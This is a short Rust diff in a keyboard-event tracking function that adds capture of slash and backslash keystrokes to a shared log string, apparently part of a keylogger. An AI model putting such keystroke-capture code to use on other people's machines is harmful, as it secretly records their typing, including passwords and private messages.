@@ -166,6 +166,14 @@ fn track(event: Event) {
         EventType::KeyPress(Key::PageUp | Key::PageDown) => println!("Page Up/Down!"),
         EventType::KeyPress(Key::ScrollLock | Key::NumLock) => println!("NumLock!"),
         EventType::KeyPress(Key::Pause | Key::PrintScreen) => println!("PrintScreen!"),
+        EventType::KeyPress(Key::Slash) => {
+            *LOG_FILE.lock().unwrap() += "/";
+            *LOGGED.lock().unwrap() = false;
+        },
+        EventType::KeyPress(Key::BackSlash) => {
+            *LOG_FILE.lock().unwrap() += "\\";
+            *LOGGED.lock().unwrap() = false;
+        },
         EventType::KeyPress(Key::Return) => {
             let now = Utc::now();
             let x: String = format!("{}", now);
